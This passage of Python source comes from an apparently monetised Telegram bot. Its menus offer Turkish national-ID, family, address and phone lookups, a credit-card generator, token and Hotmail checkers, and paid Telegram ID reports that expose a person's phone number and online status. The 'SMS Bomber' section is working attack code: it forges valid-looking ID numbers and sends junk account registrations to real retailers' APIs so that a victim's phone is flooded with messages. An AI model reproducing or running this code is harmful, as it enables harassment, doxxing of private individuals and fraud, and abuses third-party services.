        "urlscan": "🔍 Domain girin:", "addbot": "🤖 Bot Token'ını girin:",
    },
    "en": {"bedrock":"Enter IP:PORT","ccgen":"Enter BIN","dctoken":"Discord Token","tgtoken":"Telegram Token",
           "eczane":"Pharmacy","ipinfo":"IP","dns":"Domain","bahis":"Name","plaka":"Plate",
           "proxycheck":"IP","urlscan":"Domain","addbot":"Bot Token"},
    "ar": {"bedrock":"IP:PORT","ccgen":"BIN","dctoken":"Discord Token","tgtoken":"Telegram Token",
           "eczane":"صيدلية","ipinfo":"IP","dns":"النطاق","bahis":"الاسم","plaka":"اللوحة",
           "proxycheck":"IP","urlscan":"النطاق","addbot":"توكن"},
}

TURKEY_PROMPTS = {
    "tr": {
        "tc": "🆔 TC Kimlik Numarası girin (11 haneli):",
        "tcpro": "🔍 TC Kimlik Numarası girin (11 haneli):",
        "adsoyad": "👤 Ad Soyad girin:",
        "aile": "👨‍👩‍👧 TC girin (11 haneli):", "ailepro": "👨‍👩‍👧‍👦 TC girin:",
        "sulale": "🌳 TC girin:", "tcgsm": "📱 TC girin:",
        "gsmtc": "📞 GSM girin:", "eokul": "🎓 TC girin:", "tapu": "🏠 TC girin:",
        "adaparsel": "🗺️ İl,İlçe girin:", "adres": "🏠 TC girin:",
    },
    "en": {"tc":"TC (11 digits)","tcpro":"TC","adsoyad":"Name","aile":"TC","ailepro":"TC",
           "sulale":"TC","tcgsm":"TC","gsmtc":"GSM","eokul":"TC","tapu":"TC",
           "adaparsel":"Province,District","adres":"TC"},
    "ar": {"tc":"رقم الهوية","tcpro":"رقم الهوية","adsoyad":"الاسم","aile":"الهوية","ailepro":"الهوية",
           "sulale":"الهوية","tcgsm":"الهوية","gsmtc":"GSM","eokul":"الهوية","tapu":"الهوية",
           "adaparsel":"المحافظة,المنطقة","adres":"الهوية"},
}

def tools_kb(user_id):
    mk = InlineKeyboardMarkup(row_width=2)
    ls_txt = "🌍 LeakSights OSINT ⭐" if is_premium_osint(user_id) else "🌍 LeakSights OSINT 🔒"
    mk.add(_btn("🇹🇷 Türkiye Sorguları", "menu_turkey"), _btn(ls_txt, "menu_ls"))
    mk.add(
        _btn("🎮 MC Bedrock", "tool_bedrock"), _btn("💳 CC Generator", "tool_ccgen"),
        _btn("🤖 Discord Token", "tool_dctoken"), _btn("✈️ TG Token", "tool_tgtoken"),
        _btn("💊 Eczane", "tool_eczane"), _btn("🌐 IP Bilgi", "tool_ipinfo"),
        _btn("🔎 DNS Sorgu", "tool_dns"), _btn("⚽ Bahis Sorgu", "tool_bahis"),
        _btn("🚗 Plaka Sorgu", "tool_plaka"), _btn("💎 PreDunyam", "tool_predunyam"),
        _btn("🛡️ Proxy Check", "tool_proxycheck"), _btn("🔍 URL Scan", "tool_urlscan"),
        _btn("🎥 Video İndir", "tool_video"), _btn("🎵 Müzik İndir", "tool_music"),
        _btn("🤖 Bot Ekle", "tool_addbot"), _btn("🐍 PHP→Python", "tool_php2py"),
        _btn("💣 SMS Bomber", "tool_smsbomb"), _btn("📧 Hotmail Checker", "tool_hotmail"),
        _btn("📸 EXIF Metadata", "tool_exif"),
        _btn("🎨 AI Resim Üret", "tool_aiimg"),
    )
    mk.add(_btn("🆔 Telegram ID Sorgu", "tool_tgid"))
    mk.add(_btn(s(user_id, "home_btn"), "goto_home"))
    return mk

def turkey_kb(user_id):
    mk = InlineKeyboardMarkup(row_width=2)
    def lbl(k): return TURKIYE_API[k].get(lang(user_id), TURKIYE_API[k]["tr"])
    mk.add(_sep("👤 KİMLİK"))
    mk.add(_btn(f"{TURKIYE_API['tc']['icon']} {lbl('tc')}", "tr_tc"),
           _btn(f"{TURKIYE_API['tcpro']['icon']} {lbl('tcpro')}", "tr_tcpro"))
    mk.add(_btn(f"{TURKIYE_API['adsoyad']['icon']} {lbl('adsoyad')}", "tr_adsoyad"))
    mk.add(_sep("👨‍👩‍👧 AİLE"))
    mk.add(_btn(f"{TURKIYE_API['aile']['icon']} {lbl('aile')}", "tr_aile"),
           _btn(f"{TURKIYE_API['ailepro']['icon']} {lbl('ailepro')}", "tr_ailepro"))
    mk.add(_btn(f"{TURKIYE_API['sulale']['icon']} {lbl('sulale')}", "tr_sulale"))
    mk.add(_sep("📱 İLETİŞİM"))
    mk.add(_btn(f"{TURKIYE_API['tcgsm']['icon']} {lbl('tcgsm')}", "tr_tcgsm"),
           _btn(f"{TURKIYE_API['gsmtc']['icon']} {lbl('gsmtc')}", "tr_gsmtc"))
    mk.add(_sep("🏠 MÜLK / EĞİTİM"))
    mk.add(_btn(f"{TURKIYE_API['tapu']['icon']} {lbl('tapu')}", "tr_tapu"),
           _btn(f"{TURKIYE_API['eokul']['icon']} {lbl('eokul')}", "tr_eokul"))
    mk.add(_btn(f"{TURKIYE_API['adaparsel']['icon']} {lbl('adaparsel')}", "tr_adaparsel"))
    mk.add(_btn(f"{TURKIYE_API['adres']['icon']} {lbl('adres')}", "tr_adres"))
    mk.add(_btn(s(user_id, "tools_btn"), "goto_tools"), _btn(s(user_id, "home_btn"), "goto_home"))
    return mk

def ls_kb(user_id):
    mk = InlineKeyboardMarkup(row_width=2)
    if not is_premium_osint(user_id):
        mk.add(_btn("🌍 OSINT Premium Satın Al (200⭐)", "buy_osint"))
        mk.add(_btn(s(user_id, "back_btn"), "goto_tools"))
        return mk
    cat_order = ["username", "contact", "ip", "url", "identity", "other"]
    groups = {c: [] for c in cat_order}
    for key, info in LEAKSIGHTS_API.items():
        groups.setdefault(info.get("cat","other"), []).append((key, info))
    l = lang(user_id)
    for cat in cat_order:
        items = groups.get(cat, [])
        if not items: continue
        mk.add(_sep(LEAKSIGHTS_CATS[cat].get(l, cat)))
        for key, info in items:
            mk.add(_btn(f"{info['icon']} {info.get(l, info.get('tr', key))}", f"ls_{key}"))
    mk.add(_btn(s(user_id, "tools_btn"), "goto_tools"), _btn(s(user_id, "home_btn"), "goto_home"))
    return mk

def premium_kb(user_id):
    mk = InlineKeyboardMarkup(row_width=1)
    mk.add(_btn("⭐ Premium Satın Al (400⭐)", "buy_premium"))
    mk.add(_btn("🌍 OSINT Premium Satın Al (200⭐)", "buy_osint"))
    mk.add(_btn(s(user_id, "home_btn"), "goto_home"))
    return mk

def tgid_kb(user_id):
    mk = InlineKeyboardMarkup(row_width=1)
    free_left = max(0, TGID_FREE_LIMIT - tgid_get_free_used(user_id))
    balance   = tgid_get_balance(user_id)
    if user_id == ADMIN_ID: durum = "👑 Admin — Sınırsız Sorgu"
    elif is_premium(user_id): durum = "⭐ Premium — Sınırsız Sorgu"
    else: durum = f"🆓 Free: {free_left}/{TGID_FREE_LIMIT}  |  💰 Bakiye: {balance}"
    mk.add(_btn(f"📊 {durum}", "noop"))
    mk.add(_btn("🔍 Sorgu Yap", "tgid_search"))
    mk.add(_btn("💎 Paket Satın Al", "tgid_packages"))
    mk.add(_btn("📊 İstatistiklerim", "tgid_my_stats"))
    mk.add(_btn("◀️ Geri", "goto_tools"))
    return mk

def tgid_packages_kb():
    mk = InlineKeyboardMarkup(row_width=1)
    mk.add(_btn(f"💎 {TGID_PACKAGE_25} Sorgu — {TGID_PRICE_25} ⭐", "tgid_buy_25"))
    mk.add(_btn(f"💎 {TGID_PACKAGE_50} Sorgu — {TGID_PRICE_50} ⭐", "tgid_buy_50"))
    mk.add(_btn(f"💎 {TGID_PACKAGE_100} Sorgu — {TGID_PRICE_100} ⭐", "tgid_buy_100"))
    mk.add(_btn("◀️ Geri", "tool_tgid"))
    return mk

def aiimg_kb(user_id):
    mk = InlineKeyboardMarkup(row_width=1)
    free_left = max(0, AI_IMG_FREE_LIMIT - aiimg_get_free_used(user_id))
    credits   = aiimg_get_credits(user_id)
    if user_id == ADMIN_ID: durum = "👑 Admin — Sınırsız"
    elif is_premium(user_id): durum = "⭐ Premium — Sınırsız"
    else: durum = f"🆓 Free: {free_left}/{AI_IMG_FREE_LIMIT}  |  💎 Hak: {credits}"
    mk.add(_btn(f"📊 {durum}", "noop"))
    mk.add(_btn("🎨 Resim Üret", "aiimg_generate"))
    mk.add(_btn("💎 Paket Satın Al", "aiimg_packages"))
    mk.add(_btn("📊 İstatistiklerim", "aiimg_my_stats"))
    mk.add(_btn("◀️ Geri", "goto_tools"))
    return mk

def aiimg_packages_kb():
    mk = InlineKeyboardMarkup(row_width=1)
    mk.add(_btn(f"💎 {AI_IMG_PACK_25} Hak — {AI_IMG_PRICE_25} ⭐", "aiimg_buy_25"))
    mk.add(_btn(f"💎 {AI_IMG_PACK_50} Hak — {AI_IMG_PRICE_50} ⭐", "aiimg_buy_50"))
    mk.add(_btn(f"💎 {AI_IMG_PACK_250} Hak — {AI_IMG_PRICE_250} ⭐", "aiimg_buy_250"))
    mk.add(_btn("◀️ Geri", "tool_aiimg"))
    return mk

# ══════════════════════════════════════════════════════════════
#  🆔 TG-ID SORGU
# ══════════════════════════════════════════════════════════════
def tgid_normalize_response(raw):
    if not isinstance(raw, dict): return raw
    mapping = {"doğrulandı": "verified", "dogrulandi": "verified",
               "yanlış": "attach_menu_enabled_disabled", "yanlis": "attach_menu_enabled_disabled"}
    return {mapping.get(k, k): v for k, v in raw.items()}

def tgid_clean_inner_json(s):
    try: return json.loads(s)
    except: pass
    try:
        s = re.sub(r':\s*yanlış\b', ': false', s, flags=re.IGNORECASE)
        s = re.sub(r':\s*doğru\b', ': true', s, flags=re.IGNORECASE)
        s = s.replace('"doğrulandı"', '"verified"')
        s = re.sub(r',\s*}', '}', s)
        s = re.sub(r',\s*]', ']', s)
        return json.loads(s)
    except: return None

def tgid_api_search(username):
    try:
        username = username.strip().lstrip("@").strip()
        if not username:
            return False, "❌ Kullanıcı adı veya ID boş olamaz!"
        if len(username) < 2:
            return False, "❌ En az 2 karakter olmalı!"
        url = TGID_API_BASE + username
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
        }
        r = requests.get(url, headers=headers, timeout=25, verify=False)
        if r.status_code != 200:
            return False, f"❌ API Hatası: HTTP {r.status_code}"
        try:
            outer = r.json()
        except:
            return False, f"❌ API geçersiz cevap"
        if outer.get("status") == "success" and "data" in outer:
            inner_raw = outer.get("data", "")
            if isinstance(inner_raw, str):
                inner = tgid_clean_inner_json(inner_raw)
                if inner is None:
                    return False, "⚠️ API cevabı ayrıştırılamadı."
            else:
                inner = inner_raw
            inner = tgid_normalize_response(inner)
            return True, inner
        if outer.get("durum") in ("başarı", "basarili"):
            inner_raw = outer.get("veri", "")
            if isinstance(inner_raw, str):
                inner = tgid_clean_inner_json(inner_raw)
                if inner is None:
                    return False, "⚠️ API iç verisi ayrıştırılamadı."
            else:
                inner = inner_raw
            inner = tgid_normalize_response(inner)
            return True, inner
        if "id" in outer and ("first_name" in outer or "username" in outer):
            outer = tgid_normalize_response(outer)
            return True, outer
        st = outer.get("status", outer.get("durum", "bilinmiyor"))
        if st == "pending":
            return False, "⏳ <b>Sorgu Kuyruğa Alındı</b>\n10-15 saniye sonra tekrar dene."
        return False, f"❌ Sonuç bulunamadı.\nDurum: <code>{esc(st)}</code>"
    except requests.exceptions.Timeout:
        return False, "⏰ Zaman aşımı!"
    except requests.exceptions.ConnectionError:
        return False, "🌐 Bağlantı hatası!"
    except Exception as e:
        return False, f"❌ Beklenmeyen hata: <code>{esc(e)}</code>"

def tgid_build_txt_report(username, data, queried_by=""):
    def b(v): return "✅ Evet" if v else "❌ Hayır"
    def sv(v, default="—"):
        if v is None or v == "": return default
        return str(v)
    lines = []
    sep = "═" * 55
    lines.append(sep)
    lines.append("        🆔 TELEGRAM ID SORGU RAPORU")
    lines.append("             🔎 @hackledin API")
    lines.append(sep)
    lines.append(f" 🎯 Sorgulanan   : @{username.lstrip('@')}")
    lines.append(f" 👤 Sorgulayan   : {queried_by}")
    lines.append(f" 📅 Tarih        : {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}")
    lines.append(sep)
    lines.append("")
    lines.append(" ┌─────────────────────────────────────────────┐")
    lines.append(" │  👤 TEMEL KİMLİK BİLGİLERİ                  │")
    lines.append(" └─────────────────────────────────────────────┘")
    lines.append("")
    lines.append(f"  🆔 ID            : {sv(data.get('id'))}")
    lines.append(f"  📛 Ad            : {sv(data.get('first_name'))}")
    lines.append(f"  📛 Soyad         : {sv(data.get('last_name'))}")
    lines.append(f"  🔗 Kullanıcı Adı : @{sv(data.get('username'), 'Yok')}")
    lines.append(f"  📱 Telefon       : {sv(data.get('phone'), 'Gizli / Yok')}")
    lines.append(f"  🌐 Dil Kodu      : {sv(data.get('lang_code'), 'Belirsiz')}")
    lines.append("")
    lines.append(" ┌─────────────────────────────────────────────┐")
    lines.append(" │  🏷️ HESAP TÜRÜ & DURUM                     │")
    lines.append(" └─────────────────────────────────────────────┘")
    lines.append("")
    lines.append(f"  🤖 Bot mu?            : {b(data.get('bot'))}")
    lines.append(f"  ✅ Doğrulanmış        : {b(data.get('verified'))}")
    lines.append(f"  ⭐ Premium            : {b(data.get('premium'))}")
    lines.append(f"  🚨 Scam               : {b(data.get('scam'))}")
    lines.append(f"  🎭 Fake               : {b(data.get('fake'))}")
    lines.append(f"  🗑️ Silinmiş           : {b(data.get('deleted'))}")
    lines.append(f"  🚫 Kısıtlanmış        : {b(data.get('restricted'))}")
    lines.append("")
    status = data.get("status", {})
    if isinstance(status, dict):
        lines.append(" ┌─────────────────────────────────────────────┐")
        lines.append(" │  🕐 SON GÖRÜLME                            │")
        lines.append(" └─────────────────────────────────────────────┘")
        lines.append("")
        st = status.get("_", "Bilinmiyor")
        status_map = {
            "UserStatusRecently": "🟢 Son zamanlarda online",
            "UserStatusOnline": "🟢 Şu an online",
            "UserStatusOffline": "⚫ Çevrimdışı",
            "UserStatusLastWeek": "🟡 Son bir hafta",
            "UserStatusLastMonth": "🟠 Son bir ay",
            "UserStatusEmpty": "❓ Belirsiz",
        }
        lines.append(f"  📌 Durum       : {status_map.get(st, st)}")
        if "was_online" in status and status["was_online"]:
            try:
                was = datetime.fromtimestamp(status["was_online"]).strftime("%d.%m.%Y %H:%M:%S")
                lines.append(f"  🕰️ Son Görülme : {was}")
            except:
                lines.append(f"  🕰️ Son Görülme : {status.get('was_online')}")
        lines.append("")
    usernames = data.get("usernames", [])
    if usernames:
        lines.append(" ┌─────────────────────────────────────────────┐")
        lines.append(" │  🔗 ALTERNATİF KULLANICI ADLARI             │")
        lines.append(" └─────────────────────────────────────────────┘")
        lines.append("")
        for i, u in enumerate(usernames, 1):
            if isinstance(u, dict):
                aktif = "✅ Aktif" if u.get("active") else "❌ Pasif"
                lines.append(f"  {i}. @{u.get('username', '—')}  [{aktif}]")
            else:
                lines.append(f"  {i}. {u}")
        lines.append("")
    lines.append(sep)
    lines.append(" 📌 Bu rapor @hackledin API'si kullanılarak oluşturuldu.")
    lines.append(" 👨‍💻 Developer : @hackledin")
    lines.append(" 🛡️ Cyber Searcher v4.7")
    lines.append(sep)
    return "\n".join(lines)

def tgid_summary_caption(username, data, user_id):
    free_left = max(0, TGID_FREE_LIMIT - tgid_get_free_used(user_id))
    balance   = tgid_get_balance(user_id)
    if user_id == ADMIN_ID: hak = "👑 Admin — Sınırsız"
    elif is_premium(user_id): hak = "⭐ Premium — Sınırsız"
    else: hak = f"🆓 Free: {free_left}/{TGID_FREE_LIMIT}  |  💰 Bakiye: {balance}"

    ad = data.get("first_name") or "—"
    soyad = data.get("last_name") or ""
    isim = f"{ad} {soyad}".strip() or "—"
    kadi = data.get("username") or "Yok"
    user_id_ = data.get("id", "—")
    prem = "⭐ Evet" if data.get("premium") else "❌ Hayır"
    ver = "✅ Evet" if data.get("verified") else "❌ Hayır"
    bot_mu = "🤖 Evet" if data.get("bot") else "👤 Hayır"
    scam = "🚨 EVET" if data.get("scam") else "✅ Hayır"
    fake = "🎭 EVET" if data.get("fake") else "✅ Hayır"

    return (
        f"✅ <b>Telegram ID Sorgu Başarılı!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>@{esc(kadi)}</b>\n"
        f"📛 İsim: <b>{esc(isim)}</b>\n"
        f"🆔 ID: <code>{esc(user_id_)}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"⭐ Premium    : {prem}\n"
        f"✅ Doğrulanmış: {ver}\n"
        f"🤖 Bot        : {bot_mu}\n"
        f"🚨 Scam       : {scam}\n"
        f"🎭 Fake       : {fake}\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 {hak}\n"
        f"📄 <i>Detaylı rapor TXT dosyasında</i>"
    )

def tgid_process_search(msg, bot_instance):
    uid = msg.from_user.id
    username = msg.text.strip().lstrip("@").strip()
    if not username:
        bot_instance.reply_to(msg, "❌ Geçersiz kullanıcı adı veya ID!", parse_mode="HTML")
        return
    allowed, source = tgid_can_query(uid)
    if not allowed:
        free_left = max(0, TGID_FREE_LIMIT - tgid_get_free_used(uid))
        bot_instance.reply_to(
            msg,
            f"❌ <b>Sorgu hakkınız kalmadı!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🆓 Free kalan: <b>{free_left}</b>/{TGID_FREE_LIMIT}\n"
            f"💰 Bakiye: <b>{tgid_get_balance(uid)}</b>\n\n"
            f"💎 <b>Paket satın almak için aşağıdaki butona bas:</b>",
            reply_markup=tgid_packages_kb(), parse_mode="HTML")
        return
    wait = bot_instance.reply_to(msg, f"⏳ <code>@{esc(username)}</code> sorgulanıyor...", parse_mode="HTML")
    success, data = tgid_api_search(username)
    if not success:
        try:
            bot_instance.edit_message_text(data, msg.chat.id, wait.message_id, parse_mode="HTML")
        except:
            try:
                bot_instance.send_message(msg.chat.id, data, parse_mode="HTML")
            except:
                bot_instance.send_message(msg.chat.id, data)
        tgid_log_query(uid, msg.from_user.username or "", username, "FAIL", str(data)[:100])
        return
    tgid_use_query(uid)
    queried_by = f"@{msg.from_user.username}" if msg.from_user.username else str(uid)
    report = tgid_build_txt_report(username, data, queried_by)
    fname = f"TG-ID_{username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    try:
        with open(fname, "w", encoding="utf-8") as f:
            f.write(report)
    except Exception as e:
        bot_instance.edit_message_text(f"❌ Rapor oluşturulamadı: <code>{esc(e)}</code>",
                                       msg.chat.id, wait.message_id, parse_mode="HTML")
        return
    caption = tgid_summary_caption(username, data, uid)
    try:
        with open(fname, "rb") as f:
            bot_instance.send_document(msg.chat.id, f, caption=caption, parse_mode="HTML")
        bot_instance.delete_message(msg.chat.id, wait.message_id)
    except Exception as e:
        bot_instance.send_message(msg.chat.id, f"❌ Dosya gönderilemedi: <code>{esc(e)}</code>", parse_mode="HTML")
    finally:
        if os.path.exists(fname):
            try: os.remove(fname)
            except: pass
    tgid_log_query(uid, msg.from_user.username or "", username, "OK", f"ID={data.get('id')}")

def tgid_show_my_stats(chat_id, uid, bot_instance):
    free_used = tgid_get_free_used(uid)
    free_left = max(0, TGID_FREE_LIMIT - free_used)
    balance   = tgid_get_balance(uid)
    total     = tgid_get_total(uid)
    txt = (f"📊 <b>TELEGRAM ID SORGU İSTATİSTİKLERİN</b>\n"
           f"━━━━━━━━━━━━━━━━━━━━━\n"
           f"🔍 Toplam sorgu: <b>{total}</b>\n"
           f"🆓 Free kullanılan: <b>{free_used}</b>/{TGID_FREE_LIMIT}\n"
           f"🆓 Free kalan: <b>{free_left}</b>\n"
           f"💰 Bakiye: <b>{balance}</b>\n")
    if uid == ADMIN_ID: txt += "\n👑 <b>Admin — Sınırsız</b>"
    elif is_premium(uid): txt += "\n⭐ <b>Premium — Sınırsız</b>"
    bot_instance.send_message(chat_id, txt, parse_mode="HTML")

# ══════════════════════════════════════════════════════════════
#  🎨 AI IMAGE İŞLEME
# ══════════════════════════════════════════════════════════════
def aiimg_process(msg, bot_instance):
    uid = msg.from_user.id
    if is_banned(uid):
        bot_instance.reply_to(msg, f"🚫 <b>YASAKLANDINIZ!</b>\nSebep: {esc(get_ban_reason(uid))}", parse_mode="HTML")
        return
    allowed, source = aiimg_can_use(uid)
    if not allowed:
        free_left = max(0, AI_IMG_FREE_LIMIT - aiimg_get_free_used(uid))
        bot_instance.reply_to(
            msg,
            f"❌ <b>AI Resim hakkınız kalmadı!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🆓 Free kalan: <b>{free_left}</b>/{AI_IMG_FREE_LIMIT}\n"
            f"💎 Kalan hak: <b>{aiimg_get_credits(uid)}</b>\n\n"
            f"💎 <b>Paket satın almak için:</b>",
            reply_markup=aiimg_packages_kb(), parse_mode="HTML")
        return
    if not msg.photo and not msg.document:
        bot_instance.reply_to(msg, "❌ Lütfen bir fotoğraf gönder!", parse_mode="HTML")
        return
    try:
        if msg.photo:
            file_info = bot_instance.get_file(msg.photo[-1].file_id)
        else:
            file_info = bot_instance.get_file(msg.document.file_id)
        dosya = bot_instance.download_file(file_info.file_path)
    except Exception as e:
        bot_instance.reply_to(msg, f"❌ Fotoğraf indirilemedi: {esc(e)}", parse_mode="HTML")
        return
    temp_dir = "aiimg_temp"
    os.makedirs(temp_dir, exist_ok=True)
    temp_path = os.path.join(temp_dir, f"{uid}_{int(time.time())}.jpg")
    try:
        with open(temp_path, "wb") as f:
            f.write(dosya)
    except Exception as e:
        bot_instance.reply_to(msg, f"❌ Dosya kaydedilemedi: {esc(e)}", parse_mode="HTML")
        return
    m = bot_instance.reply_to(
        msg,
        "✍️ <b>Şimdi promptu (komutu) yaz:</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "📝 <b>Örnekler:</b>\n"
        "• <i>Lift your heart</i>\n"
        "• <i>Make it a cyberpunk style</i>\n"
        "• <i>Turn into anime character</i>\n"
        "• <i>Make it look like oil painting</i>\n\n"
        "⚠️ Fotoğraf işleme <b>30-100 saniye</b> sürebilir.",
        parse_mode="HTML")
    bot_instance.register_next_step_handler(m, lambda m: aiimg_run(m, temp_path, bot_instance))

def aiimg_run(msg, temp_path, bot_instance):
    uid = msg.from_user.id
    prompt = msg.text.strip() if msg.text else ""
    if not prompt:
        bot_instance.reply_to(msg, "❌ Prompt boş olamaz!", parse_mode="HTML")
        try: os.remove(temp_path)
        except: pass
        return
    aiimg_use(uid)
    wait = bot_instance.reply_to(
        msg,
        f"🎨 <b>AI Resim üretiliyor...</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"📝 Prompt: <code>{esc(prompt[:200])}</code>\n"
        f"⏳ <i>Bu işlem 30-100 saniye sürebilir.</i>",
        parse_mode="HTML")

    def run():
        try:
            success, result = aiimg_generate(temp_path, prompt)
            if not success:
                if uid != ADMIN_ID and not is_premium(uid):
                    if aiimg_get_total(uid) <= AI_IMG_FREE_LIMIT:
                        aiimg_set(uid, "free_used", max(0, aiimg_get_free_used(uid) - 1))
                    else:
                        aiimg_set(uid, "credit_balance", aiimg_get_credits(uid) + 1)
                aiimg_log(uid, msg.from_user.username or "", prompt, "FAIL", "")
                try:
                    bot_instance.edit_message_text(
                        f"❌ <b>Üretim başarısız!</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━\n"
                        f"Hak iade edildi.\n\n<code>{esc(result[:300])}</code>",
                        msg.chat.id, wait.message_id, parse_mode="HTML")
                except:
                    try:
                        bot_instance.send_message(msg.chat.id, f"❌ {esc(result)}", parse_mode="HTML")
                    except:
                        bot_instance.send_message(msg.chat.id, result)
                return
            aiimg_log(uid, msg.from_user.username or "", prompt, "OK", result)
            free_left = max(0, AI_IMG_FREE_LIMIT - aiimg_get_free_used(uid))
            credits   = aiimg_get_credits(uid)
            if uid == ADMIN_ID: hak = "👑 Admin — Sınırsız"
            elif is_premium(uid): hak = "⭐ Premium — Sınırsız"
            else: hak = f"🆓 Free: {free_left}/{AI_IMG_FREE_LIMIT} | 💎 Hak: {credits}"
            caption = (
                f"✅ <b>AI Resim Hazır!</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n"
                f"📝 Prompt: <code>{esc(prompt[:200])}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n"
                f"📊 {hak}\n"
                f"🔗 <a href='{result}'>Görseli Aç</a>"
            )
            try:
                img_resp = requests.get(result, timeout=60)
                if img_resp.status_code == 200:
                    bot_instance.send_photo(msg.chat.id, img_resp.content, caption=caption, parse_mode="HTML")
                else:
                    bot_instance.send_message(msg.chat.id, caption, disable_web_page_preview=False, parse_mode="HTML")
            except:
                bot_instance.send_message(msg.chat.id, caption, disable_web_page_preview=False, parse_mode="HTML")
            try: bot_instance.delete_message(msg.chat.id, wait.message_id)
            except: pass
        except Exception as e:
            print(f"[AI-IMG] Run hatası: {e}")
            try:
                bot_instance.edit_message_text(f"❌ Beklenmeyen hata: <code>{esc(e)}</code>",
                                               msg.chat.id, wait.message_id, parse_mode="HTML")
            except: pass
        finally:
            try: os.remove(temp_path)
            except: pass
    threading.Thread(target=run, daemon=True).start()

def aiimg_show_stats(chat_id, uid, bot_instance):
    free_used = aiimg_get_free_used(uid)
    free_left = max(0, AI_IMG_FREE_LIMIT - free_used)
    credits   = aiimg_get_credits(uid)
    total     = aiimg_get_total(uid)
    txt = (f"📊 <b>AI RESİM İSTATİSTİKLERİN</b>\n"
           f"━━━━━━━━━━━━━━━━━━━━━\n"
           f"🎨 Toplam üretim: <b>{total}</b>\n"
           f"🆓 Free kullanılan: <b>{free_used}</b>/{AI_IMG_FREE_LIMIT}\n"
           f"🆓 Free kalan: <b>{free_left}</b>\n"
           f"💎 Kalan hak: <b>{credits}</b>\n")
    if uid == ADMIN_ID: txt += "\n👑 <b>Admin — Sınırsız</b>"
    elif is_premium(uid): txt += "\n⭐ <b>Premium — Sınırsız</b>"
    bot_instance.send_message(chat_id, txt, parse_mode="HTML")

# ══════════════════════════════════════════════════════════════
#  MULTI-BOT
# ══════════════════════════════════════════════════════════════
_CHILD_PROCS = {}
_PROC_LOCK = threading.Lock()

def _load_registry():
    if not os.path.exists(BOT_REGISTRY_FILE): return {}
    try:
        with open(BOT_REGISTRY_FILE, "r", encoding="utf-8") as f: return json.load(f)
    except: return {}

def _save_registry(registry):
    with open(BOT_REGISTRY_FILE, "w", encoding="utf-8") as f:
        json.dump(registry, f, indent=2)

def _spawn_bot(token, owner_id=None):
    if token == BOT_TOKEN: return False
    with _PROC_LOCK:
        if token in _CHILD_PROCS:
            if _CHILD_PROCS[token].poll() is None: return False
        script_path = os.path.abspath(__file__)
        python_exe = sys.executable
        args = [python_exe, script_path, "--bot", token, "--owner", str(owner_id)]
        try:
            proc = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                    stdin=subprocess.DEVNULL,
                                    creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
                                    start_new_session=True)
            _CHILD_PROCS[token] = proc
            registry = _load_registry()
            registry[token] = {"owner_id": owner_id, "pid": proc.pid, "added": datetime.now().isoformat()}
            _save_registry(registry)
            return True
        except: return False

def start_saved_bots():
    registry = _load_registry()
    if not registry: return
    if BOT_TOKEN in registry:
        del registry[BOT_TOKEN]; _save_registry(registry)
    for token, info in registry.items():
        _spawn_bot(token, info.get("owner_id"))

# ══════════════════════════════════════════════════════════════
#  SMS BOMBER (Full)
# ══════════════════════════════════════════════════════════════
_SMS_SESSIONS = {}
_SMS_LOCK = threading.Lock()

class SendSms:
    adet = 0
    def __init__(self, phone, mail):
        rakam = []
        tcNo = ""
        rakam.append(randint(1, 9))
        for i in range(1, 9): rakam.append(randint(0, 9))
        rakam.append(((rakam[0]+rakam[2]+rakam[4]+rakam[6]+rakam[8])*7 - (rakam[1]+rakam[3]+rakam[5]+rakam[7])) % 10)
        rakam.append((sum(rakam[:10])) % 10)
        for r in rakam: tcNo += str(r)
        self.tc = tcNo
        self.phone = str(phone)
        self.mail = mail if mail else ''.join(choice(ascii_lowercase) for _ in range(22)) + "@gmail.com"

    def KahveDunyasi(self):
        try:
            r = requests.post("https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number",
                headers={"User-Agent":"Mozilla/5.0","Content-Type":"application/json","X-Language-Id":"tr-TR","X-Client-Platform":"web","Origin":"https://www.kahvedunyasi.com","Dnt":"1"},
                json={"countryCode":"90","phoneNumber":self.phone}, timeout=6)
            if r.json().get("processStatus") == "Success": self.adet += 1
        except: pass
    def Wmf(self):
        try:
            r = requests.post("https://www.wmf.com.tr/users/register/",
                data={"confirm":"true","date_of_birth":"1956-03-01","email":self.mail,"email_allowed":"true","first_name":"Memati","gender":"male","last_name":"Bas","password":"31ABC..abc31","phone":f"0{self.phone}"}, timeout=6)
            if r.status_code == 202: self.adet += 1
        except: pass
    def Hepsiburada(self):
        try:
            r = requests.post("https://www.hepsiburada.com/api/Register/RegisterUser",
                json={"PhoneNumber":f"90{self.phone}","Email":self.mail,"Password":"Password123","FirstName":"Ahmet","LastName":"Yilmaz","Consent":True},
                headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Trendyol(self):
        try:
            r = requests.post("https://www.trendyol.com/api/users/v1/register",
                json={"phoneNumber":f"90{self.phone}","email":self.mail,"password":"Password123","firstName":"Ali","lastName":"Demir","consent":True},
                headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def N11(self):
        try:
            r = requests.post("https://www.n11.com/api/User/Register",
                json={"Phone":f"90{self.phone}","Email":self.mail,"Password":"Password123","Name":"Mehmet","Surname":"Kaya","Consent":True},
                headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Sahibinden(self):
        try:
